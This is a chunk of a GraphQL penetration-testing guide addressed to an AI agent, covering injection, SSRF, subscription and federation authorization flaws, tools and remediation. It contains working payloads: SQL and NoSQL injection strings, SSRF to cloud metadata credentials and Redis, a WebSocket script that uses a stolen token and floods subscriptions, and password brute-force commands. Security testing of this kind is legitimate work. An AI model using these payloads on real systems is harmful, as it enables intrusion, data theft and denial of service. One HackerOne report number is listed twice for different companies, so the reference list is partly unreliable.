# GraphQL Protocol Security: Subscriptions, Federation & Tools — Agent Chunk 32c
> Source: 08-protocol-specific-research.md
> Purpose: Test GraphQL subscription security, federation (Apollo/Schema Stitching) cross-service authorization gaps, review GraphQL-specific tools and real CVEs, and apply remediation patterns
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test subscriptions: subscribe to events of other users, test if subscription auth is enforced per-event (not just on connection). Test federation: query entities resolved by different subgraphs to find authorization gaps at service boundaries, test @external field resolution. Use GraphQL tools: graphw00f (fingerprint), InQL (Burp extension), Clairvoyance (schema recovery), BatchQL (batch testing). Apply remediation: disable introspection in production, implement query depth/complexity limits, per-field authorization.

---


GraphQL does not inherently prevent injection. Arguments are passed to resolvers, which may construct database queries, system commands, or other operations.

#### SQL Injection Through GraphQL Arguments

```graphql
# If the resolver builds SQL from the argument
query {
  users(filter: "name = 'admin' OR 1=1--") {
    id
    name
    email
  }
}

# SQL injection in sort argument
query {
  users(sort: "name; DROP TABLE users; --") {
    id
    name
  }
}

# Union-based SQLi
query {
  user(id: "1' UNION SELECT username,password,null FROM admin_users--") {
    name
    email
  }
}

# Blind SQLi via boolean-based
query {
  user(id: "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--") {
    name
  }
}
```

#### NoSQL Injection Through GraphQL Arguments

```graphql
# MongoDB injection
query {
  user(username: "{\"$gt\":\"\"}") {
    id
    name
    email
    password
  }
}

# MongoDB regex injection
query {
  users(filter: {username: {regex: "admin.*", options: "i"}}) {
    id
    email
  }
}

# Object injection in arguments
mutation {
  login(credentials: {
    username: "admin"
    password: {"$ne": "anything"}
  }) {
    token
  }
}
```

#### SSRF Through URL-Type Arguments

```graphql
# If a mutation accepts a URL and the server fetches it
mutation {
  importData(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    status
    data
  }
}

mutation {
  setAvatar(imageUrl: "http://internal-service:8080/admin/api/keys") {
    avatarUrl
  }
}

mutation {
  addWebhook(url: "http://10.0.0.1:6379/\r\nSET pwned true\r\n") {
    id
  }
}
```

### 2.8 Subscription Security (WebSocket-Based)

GraphQL subscriptions typically use WebSocket connections:

```javascript
// Connect to subscription endpoint
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');

ws.onopen = () => {
  // Initialize connection (GQL_CONNECTION_INIT)
  ws.send(JSON.stringify({
    type: 'connection_init',
    payload: {
      // Authentication token
      authorization: 'Bearer stolen_or_expired_token'
    }
  }));
};

ws.onmessage = (msg) => {
  const data = JSON.parse(msg.data);
  
  if (data.type === 'connection_ack') {
    // Subscribe to sensitive data
    ws.send(JSON.stringify({
      id: '1',
      type: 'start',
      payload: {
        query: `subscription {
          messageReceived(roomId: "admin-channel") {
            content
            sender { name, email }
          }
        }`
      }
    }));
    
    // Subscribe to another user's notifications
    ws.send(JSON.stringify({
      id: '2',
      type: 'start',
      payload: {
        query: `subscription {
          userNotification(userId: "victim-id") {
            type
            data
          }
        }`
      }
    }));
  }
  
  if (data.type === 'data') {
    console.log('Received:', JSON.stringify(data.payload));
  }
};

// Subscription flooding — start thousands of subscriptions
for (let i = 0; i < 10000; i++) {
  ws.send(JSON.stringify({
    id: String(i),
    type: 'start',
    payload: {
      query: `subscription { newEvent { data } }`
    }
  }));
}
```

### 2.9 Federation Security

Apollo Federation and schema stitching combine multiple GraphQL services into one API, creating cross-service security gaps.

```graphql
# Apollo Federation — _entities query
# This query allows resolving entities across service boundaries
query {
  _entities(representations: [
    {
      __typename: "User"
      id: "admin-user-id"
    }
  ]) {
    ... on User {
      id
      email
      role
      # Fields from the User service
      internalNotes
      # Fields extended by the Billing service
      billingInfo { cardLast4, balance }
      # Fields extended by the HR service
      salary
      ssn
    }
  }
}

# The _service query reveals the SDL (Schema Definition Language)
query {
  _service {
    sdl
  }
}

# Cross-service authorization gaps:
# Service A (Users): Properly checks authorization
# Service B (Orders): Extends User type with order history
# But Service B trusts the federated context without re-checking authorization
query {
  user(id: "victim-id") {
    orders {    # Resolved by Service B, which may not check user auth
      total
      items { name, price }
      paymentMethod { cardNumber, cvv }  # Sensitive data from Service B
    }
  }
}
```

### 2.10 GraphQL-Specific Tools

```bash
# InQL — GraphQL security scanner (Burp Suite extension and standalone)
# Standalone mode
inql -t https://target.com/graphql

# With authentication
inql -t https://target.com/graphql \
  -H "Authorization: Bearer $TOKEN"

# graphql-voyager — visual schema exploration
# (typically deployed as a web app pointing to the target)

# Clairvoyance — schema reconstruction without introspection
python3 -m clairvoyance \
  -u https://target.com/graphql \
  -w graphql-wordlist.txt \
  -o reconstructed_schema.json

# graphw00f — GraphQL server fingerprinting
python3 main.py -t https://target.com/graphql

# BatchQL — batching attack tool
python3 batch.py -e https://target.com/graphql \
  -q 'mutation{login(user:"admin",pass:"§PASS§"){token}}' \
  -w passwords.txt

# CrackQL — rate-limit bypass via alias-based batching
python3 CrackQL.py -t https://target.com/graphql \
  -q login_query.graphql \
  -i passwords.csv

# graphql-cop — security auditor
python3 graphql-cop.py -t https://target.com/graphql
```

### 2.11 Real CVEs and HackerOne Reports

- **CVE-2021-37699**: Next.js GraphQL SSRF — GraphQL queries could trigger server-side requests to arbitrary URLs
- **CVE-2022-37616**: Introspection bypass in certain GraphQL Java implementations allowing schema extraction even when disabled
- **CVE-2023-26144**: graphql-js denial of service via deeply nested fragment spreads
- **HackerOne #489146**: GitLab GraphQL endpoint exposed user email addresses without authorization
- **HackerOne #614355**: Shopify GraphQL mutation allowed updating another merchant's settings
- **HackerOne #489146**: Facebook GraphQL API exposed private information through nested queries
- **HackerOne #291531**: GraphQL introspection enabled on production Shopify endpoints, revealing internal types

### 2.12 GraphQL Remediation

```
1. Disable introspection in production:
   - Apollo Server: introspection: false in configuration
   - graphql-java: Disable via instrumentation
   - Express GraphQL: graphiql: false, customFormatErrorFn to strip suggestions

2. Implement query depth limiting:
   - Set maximum depth (typically 5-10)
   - Use libraries like graphql-depth-limit (Node.js)
   
3. Implement query cost analysis:
   - Assign costs to each field and type
   - Reject queries exceeding a cost threshold
   - Use graphql-query-complexity or graphql-cost-analysis

4. Field-level authorization:
   - Check authorization in EVERY resolver, not just top-level
   - Use middleware (graphql-shield for Node.js)
   - Implement authorization directives (@auth, @hasRole)

5. Persisted queries (allowlist):
   - Only allow pre-registered query hashes
   - Automatic Persisted Queries (APQ) with allowlisting

6. Disable batching or limit batch size:
   - Set maximum batch size (e.g., 5 queries per request)
   - Apply rate limiting per query, not per request

7. Input validation:
   - Validate all arguments against expected types and ranges
   - Use custom scalars for validated types (Email, URL, etc.)
   - Sanitize inputs before passing to resolvers

8. Subscription authorization:
   - Authenticate at connection_init
   - Authorize each subscription start
   - Re-validate authorization periodically for long-lived connections
```

---

